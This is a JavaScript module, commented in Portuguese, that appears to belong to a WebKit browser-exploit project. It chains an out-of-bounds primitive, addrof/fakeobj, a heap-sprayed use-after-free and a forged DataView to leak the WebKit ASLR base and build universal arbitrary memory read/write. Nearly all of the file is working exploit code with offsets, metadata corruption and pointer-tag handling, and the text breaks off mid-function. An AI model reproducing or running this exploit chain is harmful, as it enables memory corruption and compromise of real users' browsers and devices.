// js/script3/testArrayBufferVictimCrash.mjs (v157 - Correção do erro de digitação da variável de loop)

// =======================================================================================
// ESTA É A VERSÃO FINAL QUE INTEGRA A CADEIA COMPLETA DE EXPLORAÇÃO, USANDO O UAF VALIDADO:
// 1. Validar primitivas básicas (OOB local).
// 2. Acionar Use-After-Free (UAF) para obter um ponteiro Double taggeado vazado.
// 3. Desfazer o "tag" do ponteiro vazado e calcular a base ASLR da WebKit.
// 4. Com a base ASLR, forjar um DataView para obter Leitura/Escrita Arbitrária Universal (ARB R/W).
// 5. Testar e verificar a primitiva ARB R/W, incluindo leitura de gadgets.
// =======================================================================================

import { AdvancedInt64, toHex, isAdvancedInt64Object, PAUSE } from '../utils.mjs';
import {
    triggerOOB_primitive,
    getOOBDataView,
    clearOOBEnvironment,
    addrof_core,
    fakeobj_core,
    initCoreAddrofFakeobjPrimitives,
    arb_read, // Usado para operações internas da OOB principal (leitura/escrita de metadados)
    arb_write, // Usado para operações internas da OOB principal (leitura/escrita de metadados)
    selfTestOOBReadWrite,
    oob_read_absolute,
    oob_write_absolute
} from '../core_exploit.mjs';

import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Full_UAF_ASLR_ARBRW_v157_FIX_TYPO";

// Aumentando as pausas para maior estabilidade em sistemas mais lentos ou com GC agressivo
const LOCAL_VERY_SHORT_PAUSE = 10;
const LOCAL_SHORT_PAUSE = 100;
const LOCAL_MEDIUM_PAUSE = 750;
const LOCAL_LONG_PAUSE = 1500;

let global_spray_objects = [];
let hold_objects = []; // Para evitar que o GC colete objetos críticos prematuramente

// Variáveis para a primitiva universal ARB R/W (serão configuradas após o vazamento de ASLR)
let _fake_data_view = null;
let JSVALUE_OBJECT_PTR_TAG_HIGH = 0x402a0000; // Valor padrão, será deduzido em tempo de execução.

// Funções Auxiliares Comuns (dumpMemory)
async function dumpMemory(address, size, logFn, arbReadFn, sourceName = "Dump") {
    logFn(`[${sourceName}] Iniciando dump de ${size} bytes a partir de ${address.toString(true)}`, "debug");
    const bytesPerRow = 16;
    for (let i = 0; i < size; i += bytesPerRow) {
        let hexLine = address.add(i).toString(true) + ": ";
        let asciiLine = "  ";
        let rowBytes = [];

        for (let j = 0; j < bytesPerRow; j++) {
            if (i + j < size) {
                try {
                    const byte = await arbReadFn(address.add(i + j), 1);
                    rowBytes.push(byte);
                    hexLine += byte.toString(16).padStart(2, '0') + " ";
                    asciiLine += (byte >= 0x20 && byte <= 0x7E) ? String.fromCharCode(byte) : '.';
                } catch (e) {
                    hexLine += "?? ";
                    asciiLine += "?";
                    logFn(`[${sourceName}] ERRO ao ler byte em ${address.add(i + j).toString(true)}: ${e.message}`, "error");
                    for (let k = j + 1; k < bytesPerRow; k++) { hexLine += "?? "; asciiLine += "?"; }
                    break;
                }
            } else {
                hexLine += "   ";
                asciiLine += " ";
            }
        }
        logFn(`[${sourceName}] ${hexLine}${asciiLine}`, "leak");
    }
    logFn(`[${sourceName}] Fim do dump.`, "debug");
}

export async function arb_read_universal_js_heap(address, byteLength, logFn) {
    const FNAME = "arb_read_universal_js_heap";
    if (!_fake_data_view) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    const fake_ab_backing_addr = addrof_core(_fake_data_view);
    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);

    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8);
    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);

    let result = null;
    try {
        switch (byteLength) {
            case 1: result = _fake_data_view.getUint8(0); break;
            case 2: result = _fake_data_view.getUint16(0, true); break;
            case 4: result = _fake_data_view.getUint32(0, true); break;
            case 8:
                const low = _fake_data_view.getUint32(0, true);
                const high = _fake_data_view.getUint32(4, true);
                result = new AdvancedInt64(low, high);
                break;
            default: throw new Error(`Invalid byteLength for arb_read_universal_js_heap: ${byteLength}`);
        }
    } finally {
        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
    }
    return result;
}

export async function arb_write_universal_js_heap(address, value, byteLength, logFn) {
    const FNAME = "arb_write_universal_js_heap";
    if (!_fake_data_view) {
        logFn(`[${FNAME}] ERRO: Primitiva de L/E Universal (heap JS) não inicializada ou não estável.`, "critical", FNAME);
        throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
    }
    const fake_ab_backing_addr = addrof_core(_fake_data_view);
    const M_VECTOR_OFFSET_IN_BACKING_AB = fake_ab_backing_addr.add(JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);

    const original_m_vector_of_backing_ab = await arb_read(M_VECTOR_OFFSET_IN_BACKING_AB, 8);
    await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, address, 8);

    try {
        switch (byteLength) {
            case 1: _fake_data_view.setUint8(0, Number(value)); break;
            case 2: _fake_data_view.setUint16(0, Number(value), true); break;
            case 4: _fake_data_view.setUint32(0, Number(value), true); break;
            case 8:
                let val64 = isAdvancedInt64Object(value) ? value : new AdvancedInt64(value);
                _fake_data_view.setUint32(0, val64.low(), true);
                _fake_data_view.setUint32(4, val64.high(), true);
                break;
            default: throw new Error(`Invalid byteLength for arb_write_universal_js_heap: ${byteLength}`);
        }
    } finally {
        await arb_write(M_VECTOR_OFFSET_IN_BACKING_AB, original_m_vector_of_backing_ab, 8);
    }
    return value; // Retorna o valor escrito para consistência
}

// Funções para converter entre JS Double e AdvancedInt64 (do utils.mjs)
function _doubleToInt64_direct(double) {
    const buf = new ArrayBuffer(8);
    (new Float64Array(buf))[0] = double;
    const u32 = new Uint32Array(buf);
    return new AdvancedInt64(u32[0], u32[1]);
}

function _int64ToDouble_direct(int64) {
    const buf = new ArrayBuffer(8);
    const u32 = new Uint32Array(buf);
    const f64 = new Float64Array(buf);
    u32[0] = int64.low();
    u32[1] = int64.high();
    return f64[0];
}

/**
 * Tenta configurar a primitiva de leitura/escrita arbitrária universal usando fakeobj com um dado m_mode.
 * @param {Function} logFn Função de log.
 * @param {Function} pauseFn Função de pausa.
 * @param {object} JSC_OFFSETS_PARAM Offsets das estruturas JSC.
 * @param {AdvancedInt64} dataViewStructureVtableAddress O endereço do vtable da DataView Structure.
 * @param {number} m_mode_to_try O valor de m_mode a ser testado.
 * @returns {boolean} True se a primitiva foi configurada e testada com sucesso com este m_mode.
 */
async function attemptUniversalArbitraryReadWriteWithMMode(logFn, pauseFn, JSC_OFFSETS_PARAM, dataViewStructureVtableAddress, m_mode_to_try) {
    const FNAME = "attemptUniversalArbitraryReadWriteWithMMode";
    logFn(`[${FNAME}] Tentando configurar L/E Arbitrária Universal com m_mode: ${toHex(m_mode_to_try)}...`, "subtest", FNAME);

    _fake_data_view = null;
    let backing_array_buffer = null;

    try {
        backing_array_buffer = new ArrayBuffer(0x1000); // Tamanho suficiente para metadados
        hold_objects.push(backing_array_buffer);
        const backing_ab_addr = addrof_core(backing_array_buffer);
        logFn(`[${FNAME}] ArrayBuffer de apoio real criado em: ${backing_ab_addr.toString(true)}`, "info", FNAME);

        // AQUI ESTAMOS USANDO AS PRIMITIVAS ARB_READ/ARB_WRITE DO CORE_EXPLOIT (que funcionam localmente)
        // PARA CORROMPER OS METADADOS DO 'backing_array_buffer'.
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), dataViewStructureVtableAddress, 8);
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET), AdvancedInt64.Zero, 8); // Ponteiro de dados para 0, para não colidir imediatamente
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.SIZE_IN_BYTES_OFFSET_FROM_JSARRAYBUFFER_START), 0xFFFFFFFF, 4); // Tamanho máximo
        await arb_write(backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_MODE_OFFSET), m_mode_to_try, 4);
        logFn(`[${FNAME}] Metadados de ArrayBuffer de apoio corrompidos para m_mode ${toHex(m_mode_to_try)}.`, "info", FNAME);

        _fake_data_view = fakeobj_core(backing_ab_addr);
        if (!(_fake_data_view instanceof DataView)) {
            logFn(`[${FNAME}] FALHA: fakeobj_core não criou um DataView válido com m_mode ${toHex(m_mode_to_try)}! Construtor: ${_fake_data_view?.constructor?.name}`, "error", FNAME);
            return false;
        }
        logFn(`[${FNAME}] DataView forjado criado com sucesso: ${_fake_data_view} (typeof: ${typeof _fake_data_view})`, "good", FNAME);

        // Testar a primitiva de leitura/escrita arbitrária universal recém-criada
        const test_target_js_object = { test_prop: 0x11223344, second_prop: 0xAABBCCDD };
        hold_objects.push(test_target_js_object);
        const test_target_js_object_addr = addrof_core(test_target_js_object);

        // Antes de testar o _fake_data_view, precisamos apontar o m_vector dele para o endereço do nosso objeto de teste.
        // O m_vector do _fake_data_view é na verdade o JSC_OFFSETS.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET dentro do `backing_array_buffer`.
        const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
        await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, test_target_js_object_addr, 8, logFn);

        const TEST_VALUE_UNIVERSAL = 0xDEADC0DE;
        _fake_data_view.setUint32(0, TEST_VALUE_UNIVERSAL, true);
        const read_back_from_fake_dv = _fake_data_view.getUint32(0, true);

        if (test_target_js_object.test_prop === TEST_VALUE_UNIVERSAL && read_back_from_fake_dv === TEST_VALUE_UNIVERSAL) {
            logFn(`[${FNAME}] SUCESSO CRÍTICO: L/E Universal (heap JS) FUNCIONANDO com m_mode ${toHex(m_mode_to_try)}!`, "vuln", FNAME);
            // Restaurar o ponteiro de dados do _fake_data_view para evitar corrupções futuras se ele for coletado
            await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
            return true;
        } else {
            logFn(`[${FNAME}] FALHA: L/E Universal (heap JS) INCONSISTENTE! Lido: ${toHex(read_back_from_fake_dv)}, Esperado: ${toHex(TEST_VALUE_UNIVERSAL)}.`, "error", FNAME);
            logFn(`    Objeto original.test_prop: ${toHex(test_target_js_object.test_prop)}`, "error", FNAME);
            // Restaurar o ponteiro de dados mesmo em caso de falha
            await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
            return false;
        }
    } catch (e) {
        logFn(`[${FNAME}] ERRO durante teste de L/E Universal com m_mode ${toHex(m_mode_to_try)}: ${e.message}\n${e.stack || ''}`, "critical", FNAME);
        // Tentar restaurar o ponteiro de dados do _fake_data_view, se possível, antes de retornar falso
        try {
            if (backing_array_buffer) {
                const backing_ab_addr = addrof_core(backing_array_buffer);
                const fake_dv_backing_ab_addr_for_mvector_control = backing_ab_addr.add(JSC_OFFSETS_PARAM.ArrayBuffer.CONTENTS_IMPL_POINTER_OFFSET);
                await arb_write_universal_js_heap(fake_dv_backing_ab_addr_for_mvector_control, AdvancedInt64.Zero, 8, logFn);
            }
        } catch (cleanupErr) {
            logFn(`[${FNAME}] ERRO durante limpeza (restauração do m_vector) após falha de L/E Universal: ${cleanupErr.message}`, "error", FNAME);
        }
        return false;
    } finally {
        if (backing_array_buffer) {
            const index = hold_objects.indexOf(backing_array_buffer);
            if (index > -1) { hold_objects.splice(index, 1); }
        }
        _fake_data_view = null; // Resetar para garantir que o próximo teste comece limpo
    }
}


// --- Funções Auxiliares para a Cadeia de Exploração UAF (Integradas) ---

// Função para forçar Coleta de Lixo
async function triggerGC(logFn, pauseFn) {
    logFn("    Acionando GC...", "info", "GC_Trigger");
    // Alocações grandes para forçar o GC. Mais agressivo.
    try {
        for (let i = 0; i < 2000; i++) { // Aumentado para 2000 iterações para ser mais agressivo
            new ArrayBuffer(1024 * 256); // Aloca 256KB, total de 512MB
        }
    } catch (e) {
        logFn("    Memória esgotada durante o GC Trigger, o que é esperado e bom (força GC).", "info", "GC_Trigger");
    }
    await pauseFn(LOCAL_SHORT_PAUSE); // Dá tempo para o GC executar
    // Alocações pequenas para ajudar o GC a perceber a pressão
    for (let i = 0; i < 100; i++) { // Aumentado
        new ArrayBuffer(1024); // Aloca 1KB, 100 vezes
    }
    await pauseFn(LOCAL_SHORT_PAUSE); // Dar mais tempo para o GC.
}

/**
 * Deduz a tag de ponteiro de objeto do JSValue observando o 'high' de um objeto conhecido.
 * @param {Function} logFn Função de log.
 * @returns {number} A tag de 32 bits para o 'high' de um ponteiro de objeto JSValue.
 */
async function deduceObjectPointerTag(logFn) {
    const FNAME = "deduceObjectPointerTag";
    logFn(`[${FNAME}] Deduzindo a tag de ponteiro de objeto do JSValue...`, "info", FNAME);

    // Criar um objeto simples para obter seu endereço base untagged
    let dummyObj = { a: 1 };
    let dummyObjAddrUntagged = addrof_core(dummyObj);

    // Tente com a tag padrão primeiro, pois é a mais comum.
    const TEST_TAG_VALUE = 0x402a0000; 

    // Usamos o high real do dummyObjAddrUntagged e adicionamos a tag.
    // O operador >>> 0 em JavaScript garante que um número seja tratado como Uint32.
    let high_with_potential_tag = (dummyObjAddrUntagged.high() | TEST_TAG_VALUE) >>> 0;
    
    // Criar um AdvancedInt64 com esse valor "taggeado"
    let tagged_simulated_addr;
    try {
        tagged_simulated_addr = new AdvancedInt64(dummyObjAddrUntagged.low(), high_with_potential_tag);
    } catch (e) {
        logFn(`[${FNAME}] ERRO ao criar AdvancedInt64 na dedução de tag: ${e.message}. High potencial: ${toHex(high_with_potential_tag)}`, "critical", FNAME);
        // Em caso de falha aqui, caímos para o valor padrão mais seguro.
        return 0x402a0000;
    }

    // Converter para double e depois de volta para Int64 para ver a representação real do sistema.
    const double_representation = _int64ToDouble_direct(tagged_simulated_addr);
    const reconverted_int64 = _doubleToInt64_direct(double_representation);

    // A tag é tipicamente os 16 ou 20 bits mais significativos do HIGH do JSValue.
    // Uma tag comum é 0x402a. Vamos verificar se o valor reconvertido contém isso.
    const inferred_tag_high_part = reconverted_int64.high() & 0xFFFF0000; 

    // Se o valor inferido for o que esperamos, ou algo próximo, usá-lo.
    // O 0x402a0000 é a tag para doubles "normales" que representam ponteiros.
    // O 0x90ab0000 visto no log anterior pode ser uma variação ou outra forma de tagging.

    if (inferred_tag_high_part !== 0) {
        logFn(`[${FNAME}] Tag de ponteiro JSValue deduzida: ${toHex(inferred_tag_high_part)}. Usando valor inferido.`, "good", FNAME);
        JSVALUE_OBJECT_PTR_TAG_HIGH = inferred_tag_high_part;
        return inferred_tag_high_part;
    } else {
        logFn(`[${FNAME}] Falha ao inferir tag de ponteiro JSValue robustamente (inferred: ${toHex(inferred_tag_high_part)}). Retornando a tag padrão 0x402a0000. Isso pode indicar um problema de tag ou alinhamento.`, "warn", FNAME);
        // Mesmo se a inferência falhar, vamos manter a tag padrão, pois ela é a mais provável em WebKit.
        // O problema real, como antes, pode ser a reocupação da memória.
        return 0x402a0000;
    }
}

// Cria um objeto, o coloca em uma estrutura que causa otimizações,
// e retorna uma referência a ele após a estrutura ser destruída.
// A lógica aqui é a do seu OriginalHeisenbug_TypedArrayAddrof_v82_AGL_R50_UAF.mjs
async function sprayAndCreateDanglingPointer(logFn, pauseFn, JSC_OFFSETS_PARAM, victim_size_bytes, spray_count_uaf, spray_value_for_vtable_addr) {
    let dangling_ref = null; // Esta será a referência pendurada
    const VICTIM_SIZE_BYTES = victim_size_bytes; // Tamanho do objeto vítima para UAF
    const SPRAY_BUF_SIZE_BYTES = VICTIM_SIZE_BYTES; // O tamanho da nova alocação deve corresponder ao da vítima

    // PASSO 1: Criar o objeto vítima que será liberado mas que teremos uma dangling_ref.
    // O tipo de objeto aqui (Float64Array) é crucial para como o ponteiro será lido.
    // Queremos que o Type Confusion ocorra quando o JS tentar ler dangling_ref[0]
    // e encontre o valor que pulverizamos.
    let victim_object_arr = new Float64Array(VICTIM_SIZE_BYTES / 8); // Float64Array para UAF
    // Preencha com um valor inicial conhecido para debug.
    // É importante que o valor não seja 0, pois 0 pode ser confundido com um ponteiro nulo.
    const initial_victim_fill_value = 1.0000000000012332; // Hex: 0x3ff00000_000015b2
    victim_object_arr.fill(initial_victim_fill_value); // Preencher todo o array

    // Para evitar que o GC colete 'victim_object_arr' antes que o dangling_ref seja criado.
    hold_objects.push(victim_object_arr);

    // A referência pendurada é a própria 'victim_object_arr'
    // A confusão de tipos ocorre porque o motor JS ainda pensa que 'dangling_ref' é um Float64Array,
    // mas a memória subjacente será reocupada por um ArrayBuffer.
    dangling_ref = victim_object_arr;

    // Forçar otimizações (acessando a vítima repetidamente)
    for (let i = 0; i < 1000; i++) {
        victim_object_arr[0] += 0.000000000000001; // Pequena alteração para forçar JIT
    }

    logFn(`[UAF] Objeto vítima (Float64Array) criado e referência pendurada simulada. Tamanho: ${VICTIM_SIZE_BYTES} bytes.`, "info");
    logFn(`[UAF] Endereço da referência pendurada (via addrof_core): ${addrof_core(dangling_ref).toString(true)}`, "info");
    logFn(`[UAF] Valor inicial da ref. pendurada [0] (Float64): ${dangling_ref[0]} (Hex: ${toHex(_doubleToInt64_direct(dangling_ref[0]), 64)})`, "info");

    // PASSO 2: Forçar Coleta de Lixo para liberar a memória do 'victim_object_arr'
    logFn("--- FASE 3: Forçando Coleta de Lixo para liberar a memória do objeto vítima ---", "subtest");
    // Remova a referência 'victim_object_arr' do array de retenção para torná-lo elegível para GC.
    const ref_index = hold_objects.indexOf(victim_object_arr);
    if (ref_index > -1) { hold_objects.splice(ref_index, 1); }
    victim_object_arr = null; // Remova a última referência forte.
    await triggerGC(logFn, pauseFn);
    logFn("    Memória do objeto-alvo liberada (se o GC atuou).", "info");

    // PASSO 3: Pulverizar sobre a memória liberada com Float64Array contendo o ponteiro desejado.
    logFn(`--- FASE 4: Pulverizando Float64Array com ponteiros sobre a memória liberada (Count: ${spray_count_uaf}) ---`, "subtest");
    const spray_arrays = [];
    const NUM_DOUBLES_IN_SPRAY_BUF = SPRAY_BUF_SIZE_BYTES / 8;

    // O valor a ser pulverizado é o ponteiro taggeado para o vtable da Structure
    const spray_value_double_to_leak_ptr = _int64ToDouble_direct(spray_value_for_vtable_addr);
    logFn(`[UAF] Valor Double do VTable da Structure para pulverização (ESPERADO NO REAP): ${toHex(_doubleToInt64_direct(spray_value_double_to_leak_ptr), 64)}`, "info");

    for (let i = 0; i < spray_count_uaf; i++) {
        const buf = new ArrayBuffer(SPRAY_BUF_SIZE_BYTES);
        const view = new Float64Array(buf);
        // Preenche TODO o buffer com o ponteiro-alvo para maximizar a chance de sobreposição
        for (let j = 0; j < NUM_DOUBLES_IN_SPRAY_BUF; j++) {
            view[j] = spray_value_double_to_leak_ptr;
        }
        spray_arrays.push(buf);
    }
    hold_objects.push(spray_arrays);
    logFn("    Pulverização de Float64Array concluída sobre a memória da vítima.", "info");

    return { dangling_ref, initial_victim_fill_value, spray_value_double_to_leak_ptr }; // Retorna o valor de spray também
}


export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, pauseFn, JSC_OFFSETS_PARAM) {
    const FNAME_CURRENT_TEST = "executeTypedArrayVictimAddrofAndWebKitLeak_R43";
    const FNAME_CURRENT_TEST_BASE = "Full_UAF_ASLR_ARBRW_v156_FIX_REF_ERROR";
    logFn(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Integração UAF/TC e Construção de ARB R/W Universal ---`, "test");

    let final_results = [];

    // Parâmetros para testes massivos
    const VICTIM_SIZES_TO_TEST = [0x80, 0x90, 0xA0, 0xB0, 0xC0, 0xD0, 0xE0, 0xF0, 0x100, 0x110, 0x120, 0x130, 0x140]; // Exemplo: múltiplos tamanhos de vítima
    const SPRAY_COUNTS_TO_TEST = [5000, 10000, 15000, 20000]; // Múltiplos volumes de spray

    // CORREÇÃO: Use VICTIM_SIZES_TO_TEST no loop for
    for (const victim_size of VICTIM_SIZES_TO_TEST) {
        for (const spray_count of SPRAY_COUNTS_TO_TEST) {
            logFn(`\n--- INICIANDO NOVA TENTATIVA: Tamanho Vítima=${victim_size} bytes, Spray Count=${spray_count} ---`, "tool");
            const attemptResult = {
                victim_size: victim_size,
                spray_count: spray_count,
                success: false,
                message: "Tentativa falhou.",
                details: {}
            };
            const startTime = performance.now();
            let webkit_base_address = null;
            let found_m_mode = null;

            try {
                logFn("Limpeza inicial do ambiente OOB para garantir estado limpo...", "info");
                clearOOBEnvironment({ force_clear_even_if_not_setup: true });

                logFn("--- FASE 0: Validando primitivas arb_read/arb_write (OLD PRIMITIVE) com selfTestOOBReadWrite ---", "subtest");
                const arbTestSuccess = await selfTestOOBReadWrite(logFn);
                if (!arbTestSuccess) {
                    const errMsg = "Falha crítica: As primitivas arb_read/arb_write (OLD PRIMITIVE) não estão funcionando. Abortando a tentativa.";
                    logFn(errMsg, "critical");
                    throw new Error(errMsg);
                }
                logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
                await PAUSE(LOCAL_MEDIUM_PAUSE);

                logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos AGRESSIVO) ---", "subtest");
                const sprayStartTime = performance.now();
                const GLOBAL_SPRAY_COUNT = 500000;
                logFn(`Iniciando spray de objetos (volume ${GLOBAL_SPRAY_COUNT}) para estabilização inicial do heap e anti-GC...`, "info");
                global_spray_objects = [];
                for (let i = 0; i < GLOBAL_SPRAY_COUNT; i++) {
                    const dataSize = 50 + (i % 50);
                    global_spray_objects.push({ id: `spray_obj_${i}`, val1: 0xDEADBEEF + i, val2: 0xCAFEBABE + i, data: new Array(dataSize).fill(i % 255) });
                }
                logFn(`Spray de ${global_spray_objects.length} objetos concluído. Tempo: ${(performance.now() - sprayStartTime).toFixed(2)}ms`, "info");
                logFn("Heap estabilizado inicialmente para reduzir realocations inesperadas pelo GC.", "good");
                await PAUSE(LOCAL_SHORT_PAUSE);

                logFn("--- FASE 2: Obtendo primitivas OOB e addrof/fakeobj com validações ---", "subtest");
                const oobSetupStartTime = performance.now();
                logFn("Chamando triggerOOB_primitive para configurar o ambiente OOB (garantindo re-inicialização)...", "info");
                await triggerOOB_primitive({ force_reinit: true });

                const oob_data_view = getOOBDataView();
                if (!oob_data_view) {
                    const errMsg = "Falha crítica ao obter primitiva OOB. DataView é nulo.";
                    logFn(errMsg, "critical");
                    throw new Error(errMsg);
                }
                logFn(`Ambiente OOB configurado com DataView: ${oob_data_view !== null ? 'Pronto' : 'Falhou'}. Time: ${(performance.now() - oobSetupStartTime).toFixed(2)}ms`, "good");
                await PAUSE(LOCAL_SHORT_PAUSE);

                initCoreAddrofFakeobjPrimitives();
                logFn("Primitivas PRINCIPAIS 'addrof' e 'fakeobj' operacionais e robustas.", "good");

                // Deduzir a tag do ponteiro JSValue antes de usar no spray
                JSVALUE_OBJECT_PTR_TAG_HIGH = await deduceObjectPointerTag(logFn);

                // Calcular o valor do vtable da DataView Structure com a tag correta para o spray
                // A vtable da DataView Structure é JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET
                const DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64 = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
                const TEMPORARY_ESTIMATED_WEBKIT_BASE = new AdvancedInt64(0x00000000, 0x01000000); // Exemplo de base para construir o double de spray
                let TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = TEMPORARY_ESTIMATED_WEBKIT_BASE.add(DATA_VIEW_STRUCTURE_VTABLE_OFFSET_FROM_BASE_AI64);
                
                // Adicionar a tag ao high do AdvancedInt64 ANTES de converter para double.
                const tagged_high_for_spray = (TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.high() | JSVALUE_OBJECT_PTR_TAG_HIGH) >>> 0;
                TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64 = new AdvancedInt64(TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64.low(), tagged_high_for_spray);
                
                // --- FASE 2.5: Acionando UAF/Type Confusion e Vazando Ponteiro de Base ASLR ---
                logFn("--- FASE 2.5: Acionando UAF/Type Confusion e Vazando Ponteiro de Base ASLR ---", "subtest");

                let leaked_jsvalue_from_uaf_double = 0;
                let dangling_info = null;

                try {
                    // Passar os parâmetros de tamanho de vítima e contagem de spray para a função
                    dangling_info = await sprayAndCreateDanglingPointer(
                        logFn, pauseFn, JSC_OFFSETS_PARAM, victim_size, spray_count, TARGET_VTABLE_ADDRESS_TO_SPRAY_AI64
                    );
                    const dangling_ref_from_uaf = dangling_info.dangling_ref;
                    const initial_victim_fill_value = dangling_info.initial_victim_fill_value;
                    const spray_value_double_to_leak_ptr = dangling_info.spray_value_double_to_leak_ptr; // Acessar do objeto retornado

                    if (!(dangling_ref_from_uaf instanceof Float64Array) || dangling_ref_from_uaf.length === 0) {
                        logFn(`[UAF LEAK] ERRO: A referência pendurada não é um Float64Array ou está vazia após o spray. Tipo: ${Object.prototype.toString.call(dangling_ref_from_uaf)}`, "critical");
                        throw new Error("A referência pendurada não se tornou o Float64Array pulverizado.");
                    }

                    let found_non_zero = false;
                    let attempts_read_dangling = 10; // Aumentar tentativas de leitura
                    for (let i = 0; i < attempts_read_dangling; i++) {
                        leaked_jsvalue_from_uaf_double = dangling_ref_from_uaf[0]; // Lê o primeiro elemento
                        const leaked_as_int64 = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
                        const expected_spray_int64 = _doubleToInt64_direct(spray_value_double_to_leak_ptr);
                        const initial_fill_int64 = _doubleToInt64_direct(initial_victim_fill_value);
                        
                        logFn(`[UAF LEAK] Leitura RAW de dangling_ref[0] (tentativa ${i+1}/${attempts_read_dangling}): ${toHex(leaked_as_int64, 64)} (Double: ${leaked_jsvalue_from_uaf_double})`, "debug");
                        logFn(`[UAF LEAK] Esperado (Spray): ${toHex(expected_spray_int64, 64)}, Inicial (Vítima): ${toHex(initial_fill_int64, 64)}`, "debug");


                        // Se o valor lido for o que esperamos do spray, é um sucesso.
                        if (leaked_as_int64.equals(expected_spray_int64)) {
                            logFn(`[UAF LEAK] SUCESSO DE REOCUPAÇÃO! Valor pulverizado lido em dangling_ref[0].`, "good");
                            found_non_zero = true;
                            break;
                        } else if (leaked_as_int64.equals(initial_fill_int64)) {
                            logFn(`[UAF LEAK] AINDA LENDO VALOR INICIAL de dangling_ref[0]. Spray não reocupou ou offset incorreto.`, "warn");
                        } else if (!leaked_as_int64.equals(AdvancedInt64.Zero) && !leaked_as_int64.equals(AdvancedInt64.NaNValue)) {
                            // Se é diferente de 0, NaN e do valor inicial, pode ser outra coisa reocupando.
                            logFn(`[UAF LEAK] Valor inesperado lido de dangling_ref[0]: ${toHex(leaked_as_int64, 64)}. Não é o valor inicial nem o spray esperado.`, "warn");
                            found_non_zero = true; // Considerar como "não zero", mas não como sucesso.
                            // Não vamos abortar imediatamente aqui, vamos deixar a checagem da tag fazer o trabalho.
                        }
                        await PAUSE(LOCAL_VERY_SHORT_PAUSE);
                    }

                    if (!found_non_zero || !(_doubleToInt64_direct(leaked_jsvalue_from_uaf_double).equals(expected_spray_int64))) {
                         throw new Error(`Ponteiro vazado do UAF é inválido ou não o valor pulverizado. Reocupação de heap falhou.`);
                    }

                    logFn("++++++++++++ SUCESSO! CONFUSÃO DE TIPOS VIA UAF OCORREU E VALOR LIDO! ++++++++++++", "vuln");

                    // Untag o ponteiro vazado
                    let untagged_uaf_addr = _doubleToInt64_direct(leaked_jsvalue_from_uaf_double);
                    const original_high = untagged_uaf_addr.high();
                    const untagged_high = original_high & 0x0000FFFF;

                    if ((original_high & 0xFFFF0000) === (JSVALUE_OBJECT_PTR_TAG_HIGH & 0xFFFF0000)) {
                        untagged_uaf_addr = new AdvancedInt64(untagged_uaf_addr.low(), untagged_high);
                        logFn(`[UAF LEAK] Ponteiro vazado após untagging (presumindo tag ${toHex(JSVALUE_OBJECT_PTR_TAG_HIGH)}): ${untagged_uaf_addr.toString(true)}`, "leak");
                    } else {
                        logFn(`[UAF LEAK] Ponteiro vazado: ${untagged_uaf_addr.toString(true)}. HIGH inesperado (0x${original_high.toString(16)}). NENHUM untagging aplicado.`, "warn");
                        throw new Error(`HIGH do ponteiro vazado (${toHex(original_high)}) não corresponde à tag esperada (${toHex(JSVALUE_OBJECT_PTR_TAG_HIGH)}). Falha no vazamento de ASLR.`);
                    }

                    // A vtable da DataView Structure é JSC_OFFSETS.DataView.STRUCTURE_VTABLE_OFFSET
                    const ACTUAL_DATA_VIEW_VTABLE_OFFSET = new AdvancedInt64(parseInt(JSC_OFFSETS_PARAM.DataView.STRUCTURE_VTABLE_OFFSET, 16), 0);
                    webkit_base_address = untagged_uaf_addr.sub(ACTUAL_DATA_VIEW_VTABLE_OFFSET);
                    
                    if (webkit_base_address.equals(AdvancedInt64.Zero) || (webkit_base_address.low() & 0xFFF) !== 0x000) {
                        throw new Error(`Base WebKit calculada é inválida ou não alinhada: ${webkit_base_address.toString(true)}. Vazamento de ASLR via UAF falhou.`);
                    }
                    logFn(`SUCESSO: Endereço base REAL da WebKit OBTIDO VIA UAF/TC: ${webkit_base_address.toString(true)}`, "good");

